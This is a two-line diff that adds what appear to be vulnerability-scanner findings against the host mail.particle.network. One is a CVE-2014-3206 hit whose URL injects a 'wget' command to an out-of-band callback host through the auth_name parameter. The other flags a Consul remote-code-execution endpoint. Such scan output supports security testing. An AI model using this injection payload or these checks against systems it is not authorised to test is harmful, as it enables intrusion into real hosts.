@@ -1,0 +1,2 @@
+[CVE-2014-3206] [http] [critical] https://mail.particle.network/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d98b9io226q3em32fod0xztazctef8ju4.oast.site;
+[hashicorp-consul-rce] [http] [critical] https://mail.particle.network/v1/agent/service/register
